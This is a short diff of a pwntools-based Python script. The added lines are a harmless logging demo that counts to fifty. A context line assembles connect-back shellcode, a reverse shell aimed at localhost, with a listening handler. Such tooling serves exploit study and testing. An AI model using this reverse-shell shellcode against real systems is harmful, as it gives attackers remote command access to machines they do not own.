@@ -6,6 +6,12 @@ import sys, socket
 from pwn import *
 from i386.linux import *
 
+log.waitfor('Counting to fifty')
+for n in range(50):
+    log.status(str(n))
+    sleep(0.05)
+log.succeeded()
+
 handler = handler(timeout = 1)
 shellcode = asm(connectback('localhost', handler.port))
 
